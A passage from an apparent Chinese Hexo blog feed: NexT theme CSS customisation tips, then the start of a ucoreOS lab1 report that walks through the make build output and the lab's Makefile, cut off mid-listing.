<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">body &#123;</span><br><span class="line">  position: relative; &#x2F;* Required by scrollspy *&#x2F;</span><br><span class="line">  font-family: $font-family-base;</span><br><span class="line">  font-size: $font-size-base;</span><br><span class="line">  line-height: $line-height-base;</span><br><span class="line">  color: 颜色代码;</span><br><span class="line">  background: $body-bg-color;</span><br><span class="line"></span><br><span class="line">  +mobile() &#123; padding-right: 0 !important; &#125;</span><br><span class="line">  +tablet() &#123; padding-right: 0 !important; &#125;</span><br><span class="line">  +desktop-large() &#123; font-size: $font-size-large; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="文章页面宽度设置"><a href="#文章页面宽度设置" class="headerlink" title="文章页面宽度设置"></a>文章页面宽度设置</h2><p>在<code>theme/next/source/css/_custom</code>文件夹下打开<code>custom.styl</code>文件，往里面添加以下代码：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">.main-inner &#123;width: 页面宽度;&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="文章内单行代码的样式设置"><a href="#文章内单行代码的样式设置" class="headerlink" title="文章内单行代码的样式设置"></a>文章内单行代码的样式设置</h2><p>在上面的设置中如果更改了网页底色，单行代码的颜色可能与背景色不搭配，这时就需要我们自己设置了。具体步骤：<br>在<code>theme/next/source/css/_custom</code>文件夹下打开<code>custom.styl</code>文件，向里面添加以下代码：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">#posts code &#123;color: 颜色代码;background-color:颜色代码;&#125;</span><br></pre></td></tr></table></figure></div>
<p>其中为code的字体颜色，后者为背景颜色。</p>
<p>其他文章内的颜色可以看一下<code>theme/next/source/css/_common/scaffolding</code>文件夹下的<code>base.styl</code>文件，有需要直接更改即可。</p>
<h2 id="页面头部和底部栏的背景色修改"><a href="#页面头部和底部栏的背景色修改" class="headerlink" title="页面头部和底部栏的背景色修改"></a>页面头部和底部栏的背景色修改</h2><p>在<code>theme/next/source/css/_custom</code>文件夹下打开<code>custom.styl</code>文件，往里面添加以下代码：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">.header &#123;</span><br><span class="line">          background:rgba(颜色rgb,透明度) none repeat scroll !important;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">.footer &#123;</span><br><span class="line">          background:rgba(颜色rgb,透明度（0-1之间）) none repeat scroll !important;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>
<p>头部和底部也可以加入自定义的背景图。只需要在其中加入<code>background:url(图片的链接);</code>即可。</p>
<h2 id="网页顶部和底部的文字颜色修改"><a href="#网页顶部和底部的文字颜色修改" class="headerlink" title="网页顶部和底部的文字颜色修改"></a>网页顶部和底部的文字颜色修改</h2><p>在<code>theme/next/source/css/_custom</code>文件夹下打开<code>custom.styl</code>文件，往里面添加以下代码：</p>
<ul>
<li><p>头部文字颜色</p>
<ul>
<li>更改头部site-title的字体颜色<br>在<code>theme/next/source/css/_common/components/header</code>文件夹下打开<code>site-meta.styl</code>文件，找到<code>.brand{}</code>向里面添加以下代码：</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">color: 颜色代码 !important;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>更改头部menu的字体颜色<br>在相同的文件夹下打开<code>menu.styl</code>文件，找到<code>a{}</code>，向里面添加以下代码：</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">color: 颜色代码 !important;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>底部文字颜色</p>
<p>底部文字颜色的修改就显得很简单了，还是在<code>theme/next/source/css/_custom</code>文件夹下打开<code>custom.styl</code>文件，往里面添加以下代码：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">.footer-inner &#123;color: 颜色代码;&#125;</span><br></pre></td></tr></table></figure></div>
</li>
</ul>
<h2 id="侧栏背景图以及内部文字颜色的修改"><a href="#侧栏背景图以及内部文字颜色的修改" class="headerlink" title="侧栏背景图以及内部文字颜色的修改"></a>侧栏背景图以及内部文字颜色的修改</h2><p>在<code>theme/next/source/css/_custom</code>文件夹下打开<code>custom.styl</code>文件，往里面添加以下代码：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">#sidebar &#123;</span><br><span class="line">            background:url(图片链接);</span><br><span class="line">            background-size: cover;</span><br><span class="line">            background-position:center;</span><br><span class="line">            background-repeat:no-repeat;</span><br><span class="line">            p,span,a &#123;color: 颜色代码;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>其中设置<code>p,span,a{color:颜色代码}</code>，即可修改侧边栏内部文字的颜色。</p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
  </entry>
  <entry>
    <title>ucoreOS lab1 实验报告</title>
    <url>/posts/335ac3b4/</url>
    <content><![CDATA[<h1 id="练习1：理解通过make生成执行文件的过程。"><a href="#练习1：理解通过make生成执行文件的过程。" class="headerlink" title="练习1：理解通过make生成执行文件的过程。"></a>练习1：理解通过make生成执行文件的过程。</h1><p>列出本实验各练习中对应的OS原理的知识点，并说明本实验中的实现部分如何对应和体现了原理中的基本概念和关键知识点<a id="more"></a></p>
<p>在此练习中，大家需要通过静态分析代码来了解：</p>
<ol>
<li><p>操作系统镜像文件ucore.img是如何一步一步生成的？(需要比较详细地解释Makefile中每一条相关命令和命令参数的含义，以及说明命令导致的结果)</p>
<p>进入lab1目录下运行<code>make</code>，会在<code>bin</code>文件夹下生成<code>ucore.img</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">moocos-&gt; <span class="built_in">pwd</span></span><br><span class="line">/home/moocos/Desktop/ucore_lab/labcodes/lab1</span><br><span class="line">[~/Desktop/ucore_lab/labcodes/lab1]</span><br><span class="line">moocos-&gt; ls</span><br><span class="line">boot  kern  libs  Makefile  q.log  tools</span><br><span class="line">[~/Desktop/ucore_lab/labcodes/lab1]</span><br><span class="line">moocos-&gt; make</span><br><span class="line">+ cc kern/init/init.c</span><br><span class="line">kern/init/init.c:95:1: warning: ‘lab1_switch_test’ defined but not used [-Wunused                                                                                       -<span class="keyword">function</span>]</span><br><span class="line"> lab1_switch_test(void) &#123;</span><br><span class="line"> ^</span><br><span class="line">+ cc kern/libs/readline.c</span><br><span class="line">+ cc kern/libs/stdio.c</span><br><span class="line">+ cc kern/debug/kdebug.c</span><br><span class="line">kern/debug/kdebug.c:251:1: warning: ‘read_eip’ defined but not used [-Wunused-fun                                                                                       ction]</span><br><span class="line"> read_eip(void) &#123;</span><br><span class="line"> ^</span><br><span class="line">+ cc kern/debug/kmonitor.c</span><br><span class="line">+ cc kern/debug/panic.c</span><br><span class="line">+ cc kern/driver/clock.c</span><br><span class="line">+ cc kern/driver/console.c</span><br><span class="line">+ cc kern/driver/intr.c</span><br><span class="line">+ cc kern/driver/picirq.c</span><br><span class="line">+ cc kern/<span class="built_in">trap</span>/trap.c</span><br><span class="line">kern/<span class="built_in">trap</span>/trap.c:14:13: warning: ‘print_ticks’ defined but not used [-Wunused-fun                                                                                       ction]</span><br><span class="line"> static void <span class="function"><span class="title">print_ticks</span></span>() &#123;</span><br><span class="line">             ^</span><br><span class="line">kern/<span class="built_in">trap</span>/trap.c:30:26: warning: ‘idt_pd’ defined but not used [-Wunused-variable                                                                                       ]</span><br><span class="line"> static struct pseudodesc idt_pd = &#123;</span><br><span class="line">                          ^</span><br><span class="line">+ cc kern/<span class="built_in">trap</span>/trapentry.S</span><br><span class="line">+ cc kern/<span class="built_in">trap</span>/vectors.S</span><br><span class="line">+ cc kern/mm/pmm.c</span><br><span class="line">+ cc libs/printfmt.c</span><br><span class="line">+ cc libs/string.c</span><br><span class="line">+ ld bin/kernel</span><br><span class="line">+ cc boot/bootasm.S</span><br><span class="line">+ cc boot/bootmain.c</span><br><span class="line">+ cc tools/sign.c</span><br><span class="line">+ ld bin/bootblock</span><br><span class="line"><span class="string">'obj/bootblock.out'</span> size: 472 bytes</span><br><span class="line">build 512 bytes boot sector: <span class="string">'bin/bootblock'</span> success!</span><br><span class="line">10000+0 records <span class="keyword">in</span></span><br><span class="line">10000+0 records out</span><br><span class="line">5120000 bytes (5.1 MB) copied, 0.0179732 s, 285 MB/s</span><br><span class="line">1+0 records <span class="keyword">in</span></span><br><span class="line">1+0 records out</span><br><span class="line">512 bytes (512 B) copied, 0.000302065 s, 1.7 MB/s</span><br><span class="line">138+1 records <span class="keyword">in</span></span><br><span class="line">138+1 records out</span><br><span class="line">70775 bytes (71 kB) copied, 0.000541628 s, 131 MB/s</span><br><span class="line">[~/Desktop/ucore_lab/labcodes/lab1]</span><br><span class="line">moocos-&gt; ls</span><br><span class="line">bin  boot  kern  libs  Makefile  obj  q.log  tools</span><br><span class="line">[~/Desktop/ucore_lab/labcodes/lab1]</span><br><span class="line">moocos-&gt; ls bin/</span><br><span class="line">bootblock  kernel  sign  ucore.img</span><br><span class="line">moocos-&gt; ls obj/</span><br><span class="line">boot           bootblock.o    kern        kernel.sym  sign</span><br><span class="line">bootblock.asm  bootblock.out  kernel.asm  libs</span><br><span class="line">[~/Desktop/ucore_lab/labcodes/lab1]</span><br><span class="line">moocos-&gt; <span class="built_in">cd</span> ..</span><br><span class="line">[~/Desktop/ucore_lab/labcodes]</span><br><span class="line">moocos-&gt; diff -r lab1 ~/moocos/ucore_lab/labcodes/lab1 <span class="comment">#比较文件</span></span><br><span class="line">Only <span class="keyword">in</span> lab1: bin</span><br><span class="line">Only <span class="keyword">in</span> lab1: obj</span><br></pre></td></tr></table></figure></div>
<p>从上面<code>diff</code>命令可以看到，唯一不同于原文件的是生成了bin文件夹和obj文件夹</p>
</li>
</ol>
<p>查看Makefile内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MAKEFILE"><figure class="iseeu highlight /makefile"><table><tr><td class="code"><pre><span class="line">PROJ    := challenge</span><br><span class="line">EMPTY   :=</span><br><span class="line">SPACE   := <span class="variable">$(EMPTY)</span> <span class="variable">$(EMPTY)</span></span><br><span class="line">SLASH   := /</span><br><span class="line"></span><br><span class="line">V       := @</span><br><span class="line"><span class="comment">#need llvm/cang-3.5+</span></span><br><span class="line"><span class="comment">#USELLVM := 1</span></span><br><span class="line"><span class="comment"># try to infer the correct GCCPREFX</span></span><br><span class="line"><span class="keyword">ifndef</span> GCCPREFIX</span><br><span class="line">GCCPREFIX := <span class="variable">$(<span class="built_in">shell</span> <span class="built_in">if</span> i386-elf-objdump -i 2&gt;&amp;1 | grep '^elf32-i386$$' &gt;/dev/null 2&gt;&amp;1; \</span></span><br><span class="line"><span class="variable">        then echo 'i386-elf-'; \</span></span><br><span class="line"><span class="variable">        elif objdump -i 2&gt;&amp;1 | grep 'elf32-i386' &gt;/dev/null 2&gt;&amp;1; \</span></span><br><span class="line"><span class="variable">        then echo ''; \</span></span><br><span class="line"><span class="variable">        else echo "***" 1&gt;&amp;2; \</span></span><br><span class="line"><span class="variable">        echo "*** Error: Couldn't find an i386-elf version of GCC/binutils." 1&gt;&amp;2; \</span></span><br><span class="line"><span class="variable">        echo "*** Is the directory with i386-elf-gcc in your PATH?" 1&gt;&amp;2; \</span></span><br><span class="line"><span class="variable">        echo "*** If your i386-elf toolchain is installed with a command" 1&gt;&amp;2; \</span></span><br><span class="line"><span class="variable">        echo "*** prefix other than 'i386-elf-', set your GCCPREFIX" 1&gt;&amp;2; \</span></span><br><span class="line"><span class="variable">        echo "*** environment variable to that prefix <span class="built_in">and</span> run 'make' again." 1&gt;&amp;2; \</span></span><br><span class="line"><span class="variable">        echo "*** To turn off this <span class="built_in">error</span>, run 'gmake GCCPREFIX= ...'." 1&gt;&amp;2; \</span></span><br><span class="line"><span class="variable">        echo "***" 1&gt;&amp;2; exit 1; fi)</span></span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># try to infer the correct QEMU</span></span><br><span class="line"><span class="keyword">ifndef</span> QEMU</span><br><span class="line">QEMU := <span class="variable">$(<span class="built_in">shell</span> <span class="built_in">if</span> which qemu-system-i386 &gt; /dev/null; \</span></span><br><span class="line"><span class="variable">        then echo 'qemu-system-i386'; exit; \</span></span><br><span class="line"><span class="variable">        elif which i386-elf-qemu &gt; /dev/null; \</span></span><br><span class="line"><span class="variable">        then echo 'i386-elf-qemu'; exit; \</span></span><br><span class="line"><span class="variable">        elif which qemu &gt; /dev/null; \</span></span><br><span class="line"><span class="variable">        then echo 'qemu'; exit; \</span></span><br><span class="line"><span class="variable">        else \</span></span><br><span class="line"><span class="variable">        echo "***" 1&gt;&amp;2; \</span></span><br><span class="line"><span class="variable">        echo "*** Error: Couldn't find a working QEMU executable." 1&gt;&amp;2; \</span></span><br><span class="line"><span class="variable">        echo "*** Is the directory containing the qemu binary in your PATH" 1&gt;&amp;2; \</span></span><br><span class="line"><span class="variable">        echo "***" 1&gt;&amp;2; exit 1; fi)</span></span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># eliminate default suffix rules</span></span><br><span class="line"><span class="section">.SUFFIXES: .c .S .h</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># delete target files if there is an error (or make is interrupted)</span></span><br><span class="line"><span class="section">.DELETE_ON_ERROR:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># define compiler and flags</span></span><br><span class="line"><span class="keyword">ifndef</span>  USELLVM</span><br><span class="line">HOSTCC          := gcc</span><br><span class="line">HOSTCFLAGS      := -g -Wall -O2</span><br><span class="line">CC              := <span class="variable">$(GCCPREFIX)</span>gcc</span><br><span class="line">CFLAGS  := -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc <span class="variable">$(DEFS)</span></span><br><span class="line">CFLAGS  += <span class="variable">$(<span class="built_in">shell</span> <span class="variable">$(CC)</span> -fno-stack-protector -E -x c /dev/null &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo -fno-stack-protector)</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">HOSTCC          := clang</span><br><span class="line">HOSTCFLAGS      := -g -Wall -O2</span><br><span class="line">CC              := clang</span><br><span class="line">CFLAGS  := -fno-builtin -Wall -g -m32 -mno-sse -nostdinc <span class="variable">$(DEFS)</span></span><br><span class="line">CFLAGS  += <span class="variable">$(<span class="built_in">shell</span> <span class="variable">$(CC)</span> -fno-stack-protector -E -x c /dev/null &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo -fno-stack-protector)</span></span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line">CTYPE   := c S</span><br><span class="line"></span><br><span class="line">LD      := <span class="variable">$(GCCPREFIX)</span>ld</span><br><span class="line">LDFLAGS := -m <span class="variable">$(<span class="built_in">shell</span> <span class="variable">$(LD)</span> -V | grep elf_i386 2&gt;/dev/null)</span></span><br><span class="line">LDFLAGS += -nostdlib</span><br><span class="line"></span><br><span class="line">OBJCOPY := <span class="variable">$(GCCPREFIX)</span>objcopy</span><br><span class="line">OBJDUMP := <span class="variable">$(GCCPREFIX)</span>objdump</span><br><span class="line"></span><br><span class="line">COPY    := cp</span><br><span class="line">MKDIR   := mkdir -p</span><br><span class="line">MV              := mv</span><br><span class="line">RM              := rm -f</span><br><span class="line">AWK             := awk</span><br><span class="line">SED             := sed</span><br><span class="line">SH              := sh</span><br><span class="line">TR              := tr</span><br><span class="line">TOUCH   := touch -c</span><br><span class="line"></span><br><span class="line">OBJDIR  := obj</span><br><span class="line">BINDIR  := bin</span><br><span class="line"></span><br><span class="line">ALLOBJS :=</span><br><span class="line">ALLDEPS :=</span><br><span class="line">TARGETS :=</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> tools/function.mk</span><br><span class="line"></span><br><span class="line">listf_cc = <span class="variable">$(<span class="built_in">call</span> listf,$(1)</span>,<span class="variable">$(CTYPE)</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># for cc</span></span><br><span class="line">add_files_cc = <span class="variable">$(<span class="built_in">call</span> add_files,$(1)</span>,<span class="variable">$(CC)</span>,<span class="variable">$(CFLAGS)</span> $(3),$(2),$(4))</span><br><span class="line">create_target_cc = <span class="variable">$(<span class="built_in">call</span> create_target,$(1)</span>,$(2),$(3),<span class="variable">$(CC)</span>,<span class="variable">$(CFLAGS)</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># for hostcc</span></span><br><span class="line">add_files_host = <span class="variable">$(<span class="built_in">call</span> add_files,$(1)</span>,<span class="variable">$(HOSTCC)</span>,<span class="variable">$(HOSTCFLAGS)</span>,$(2),$(3))</span><br><span class="line">create_target_host = <span class="variable">$(<span class="built_in">call</span> create_target,$(1)</span>,$(2),$(3),<span class="variable">$(HOSTCC)</span>,<span class="variable">$(HOSTCFLAGS)</span>)</span><br><span class="line"></span><br><span class="line">cgtype = <span class="variable">$(<span class="built_in">patsubst</span> %.$(2)</span>,%.$(3),$(1))</span><br><span class="line">objfile = <span class="variable">$(<span class="built_in">call</span> toobj,$(1)</span>)</span><br><span class="line">asmfile = <span class="variable">$(<span class="built_in">call</span> cgtype,$(<span class="built_in">call</span> toobj,$(1)</span>),o,asm)</span><br><span class="line">outfile = <span class="variable">$(<span class="built_in">call</span> cgtype,$(<span class="built_in">call</span> toobj,$(1)</span>),o,out)</span><br><span class="line">symfile = <span class="variable">$(<span class="built_in">call</span> cgtype,$(<span class="built_in">call</span> toobj,$(1)</span>),o,sym)</span><br><span class="line"></span><br><span class="line"><span class="comment"># for match pattern</span></span><br><span class="line">match = <span class="variable">$(<span class="built_in">shell</span> echo $(2)</span> | <span class="variable">$(AWK)</span> '&#123;for(i=1;i&lt;=NF;i++)&#123;if(match(<span class="string">"$(1)"</span>,<span class="string">"^"</span>$<span class="variable">$(i)</span><span class="string">"$$"</span>))&#123;exit 1;&#125;&#125;&#125;'; echo $<span class="variable">$?</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span></span><br><span class="line"><span class="comment"># include kernel/user</span></span><br><span class="line"></span><br><span class="line">INCLUDE += libs/</span><br><span class="line"></span><br><span class="line">CFLAGS  += <span class="variable">$(<span class="built_in">addprefix</span> -I,<span class="variable">$(INCLUDE)</span>)</span></span><br><span class="line"></span><br><span class="line">LIBDIR  += libs</span><br><span class="line"></span><br><span class="line"><span class="variable">$(<span class="built_in">call</span> add_files_cc,$(<span class="built_in">call</span> listf_cc,<span class="variable">$(LIBDIR)</span>)</span>,libs,)</span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># kernel</span></span><br><span class="line"></span><br><span class="line">KINCLUDE        += kern/debug/ \</span><br><span class="line">                           kern/driver/ \</span><br><span class="line">                           kern/trap/ \</span><br><span class="line">                           kern/mm/</span><br><span class="line"></span><br><span class="line">KSRCDIR         += kern/init \</span><br><span class="line">                           kern/libs \</span><br><span class="line">                           kern/debug \</span><br><span class="line">                           kern/driver \</span><br><span class="line">                           kern/trap \</span><br><span class="line">                           kern/mm</span><br><span class="line"></span><br><span class="line">KCFLAGS         += <span class="variable">$(<span class="built_in">addprefix</span> -I,<span class="variable">$(KINCLUDE)</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(<span class="built_in">call</span> add_files_cc,$(<span class="built_in">call</span> listf_cc,<span class="variable">$(KSRCDIR)</span>)</span>,kernel,<span class="variable">$(KCFLAGS)</span>)</span><br><span class="line"></span><br><span class="line">KOBJS   = <span class="variable">$(<span class="built_in">call</span> read_packet,kernel libs)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create kernel target</span></span><br><span class="line">kernel = <span class="variable">$(<span class="built_in">call</span> totarget,kernel)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(kernel)</span>: tools/kernel.ld</span><br><span class="line"></span><br><span class="line"><span class="variable">$(kernel)</span>: <span class="variable">$(KOBJS)</span></span><br><span class="line">        @echo + ld <span class="variable">$@</span></span><br><span class="line">        <span class="variable">$(V)</span><span class="variable">$(LD)</span> <span class="variable">$(LDFLAGS)</span> -T tools/kernel.ld -o <span class="variable">$@</span> <span class="variable">$(KOBJS)</span></span><br><span class="line">        @<span class="variable">$(OBJDUMP)</span> -S <span class="variable">$@</span> &gt; <span class="variable">$(<span class="built_in">call</span> asmfile,kernel)</span></span><br><span class="line">        @<span class="variable">$(OBJDUMP)</span> -t <span class="variable">$@</span> | <span class="variable">$(SED)</span> '1,/SYMBOL TABLE/d; s/ .* / /; /^$$/d' &gt; <span class="variable">$(<span class="built_in">call</span> symfile,kernel)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(<span class="built_in">call</span> create_target,kernel)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create bootblock</span></span><br><span class="line">bootfiles = <span class="variable">$(<span class="built_in">call</span> listf_cc,boot)</span></span><br><span class="line"><span class="variable">$(<span class="built_in">foreach</span> f,<span class="variable">$(bootfiles)</span>,$(<span class="built_in">call</span> cc_compile,<span class="variable">$(f)</span>,<span class="variable">$(CC)</span>,<span class="variable">$(CFLAGS)</span> -Os -nostdinc)</span>)</span><br><span class="line"></span><br><span class="line">bootblock = <span class="variable">$(<span class="built_in">call</span> totarget,bootblock)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(bootblock)</span>: <span class="variable">$(<span class="built_in">call</span> toobj,<span class="variable">$(bootfiles)</span>)</span> | <span class="variable">$(<span class="built_in">call</span> totarget,sign)</span></span><br><span class="line">        @echo + ld <span class="variable">$@</span></span><br><span class="line">        <span class="variable">$(V)</span><span class="variable">$(LD)</span> <span class="variable">$(LDFLAGS)</span> -N -e start -Ttext 0x7C00 <span class="variable">$^</span> -o <span class="variable">$(<span class="built_in">call</span> toobj,bootblock)</span></span><br><span class="line">        @<span class="variable">$(OBJDUMP)</span> -S <span class="variable">$(<span class="built_in">call</span> objfile,bootblock)</span> &gt; <span class="variable">$(<span class="built_in">call</span> asmfile,bootblock)</span></span><br><span class="line">        @<span class="variable">$(OBJCOPY)</span> -S -O binary <span class="variable">$(<span class="built_in">call</span> objfile,bootblock)</span> <span class="variable">$(<span class="built_in">call</span> outfile,bootblock)</span></span><br><span class="line">        @<span class="variable">$(<span class="built_in">call</span> totarget,sign)</span> <span class="variable">$(<span class="built_in">call</span> outfile,bootblock)</span> <span class="variable">$(bootblock)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(<span class="built_in">call</span> create_target,bootblock)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create 'sign' tools</span></span><br><span class="line"><span class="variable">$(<span class="built_in">call</span> add_files_host,tools/sign.c,sign,sign)</span></span><br><span class="line"><span class="variable">$(<span class="built_in">call</span> create_target_host,sign,sign)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create ucore.img</span></span><br><span class="line">UCOREIMG        := <span class="variable">$(<span class="built_in">call</span> totarget,ucore.img)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(UCOREIMG)</span>: <span class="variable">$(kernel)</span> <span class="variable">$(bootblock)</span></span><br><span class="line">        <span class="variable">$(V)</span>dd if=/dev/zero of=<span class="variable">$@</span> count=10000</span><br><span class="line">        <span class="variable">$(V)</span>dd if=<span class="variable">$(bootblock)</span> of=<span class="variable">$@</span> conv=notrunc</span><br><span class="line">        <span class="variable">$(V)</span>dd if=<span class="variable">$(kernel)</span> of=<span class="variable">$@</span> seek=1 conv=notrunc</span><br><span class="line"></span><br><span class="line"><span class="variable">$(<span class="built_in">call</span> create_target,ucore.img)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(<span class="built_in">call</span> finish_all)</span></span><br><span class="line"></span><br><span class="line">IGNORE_ALLDEPS  = clean \</span><br><span class="line">                                  dist-clean \</span><br><span class="line">                                  grade \</span><br><span class="line">                                  touch \</span><br><span class="line">                                  print-.+ \</span><br><span class="line">                                  handin</span><br><span class="line"></span><br><span class="line"><span class="keyword">ifeq</span> (<span class="variable">$(<span class="built_in">call</span> match,<span class="variable">$(MAKECMDGOALS)</span>,<span class="variable">$(IGNORE_ALLDEPS)</span>)</span>,0)</span><br><span class="line"><span class="keyword">-include</span> <span class="variable">$(ALLDEPS)</span></span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># files for grade script</span></span><br><span class="line"></span><br><span class="line"><span class="section">TARGETS: <span class="variable">$(TARGETS)</span></span></span><br><span class="line"></span><br><span class="line">.DEFAULT_GOAL := TARGETS</span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">.PHONY</span>: qemu qemu-nox debug debug-nox</span></span><br><span class="line"><span class="section">qemu-mon: <span class="variable">$(UCOREIMG)</span></span></span><br><span class="line">        <span class="variable">$(V)</span><span class="variable">$(QEMU)</span>  -no-reboot -monitor stdio -hda <span class="variable">$&lt;</span> -serial null</span><br><span class="line"><span class="section">qemu: <span class="variable">$(UCOREIMG)</span></span></span><br><span class="line">        <span class="variable">$(V)</span><span class="variable">$(QEMU)</span> -no-reboot -parallel stdio -hda <span class="variable">$&lt;</span> -serial null</span><br><span class="line"><span class="section">log: <span class="variable">$(UCOREIMG)</span></span></span><br><span class="line">        <span class="variable">$(V)</span><span class="variable">$(QEMU)</span> -no-reboot -d int,cpu_reset  -D q.log -parallel stdio -hda <span class="variable">$&lt;</span> -serial null</span><br><span class="line"><span class="section">qemu-nox: <span class="variable">$(UCOREIMG)</span></span></span><br><span class="line">        <span class="variable">$(V)</span><span class="variable">$(QEMU)</span>   -no-reboot -serial mon:stdio -hda <span class="variable">$&lt;</span> -nographic</span><br><span class="line">TERMINAL        :=gnome-terminal</span><br><span class="line"><span class="section">debug: <span class="variable">$(UCOREIMG)</span></span></span><br><span class="line">        <span class="variable">$(V)</span><span class="variable">$(QEMU)</span> -S -s -parallel stdio -hda <span class="variable">$&lt;</span> -serial null &amp;</span><br><span class="line">        <span class="variable">$(V)</span>sleep 2</span><br><span class="line">        <span class="variable">$(V)</span><span class="variable">$(TERMINAL)</span> -e <span class="string">"gdb -q -tui -x tools/gdbinit"</span></span><br><span class="line"></span><br><span class="line"><span class="section">debug-nox: <span class="variable">$(UCOREIMG)</span></span></span><br><span class="line">        <span class="variable">$(V)</span><span class="variable">$(QEMU)</span> -S -s -serial mon:stdio -hda <span class="variable">$&lt;</span> -nographic &amp;</span><br><span class="line">        <span class="variable">$(V)</span>sleep 2</span><br><span class="line">        <span class="variable">$(V)</span><span class="variable">$(TERMINAL)</span> -e <span class="string">"gdb -q -x tools/gdbinit"</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">.PHONY</span>: grade touch</span></span><br><span class="line"></span><br><span class="line">GRADE_GDB_IN    := .gdb.in</span><br><span class="line">GRADE_QEMU_OUT  := .qemu.out</span><br><span class="line">HANDIN                  := proj<span class="variable">$(PROJ)</span>-handin.tar.gz</span><br><span class="line"></span><br><span class="line">TOUCH_FILES             := kern/trap/trap.c</span><br><span class="line"></span><br><span class="line">MAKEOPTS                := --quiet --no-print-directory</span><br><span class="line"></span><br><span class="line"><span class="section">grade:</span></span><br><span class="line">        <span 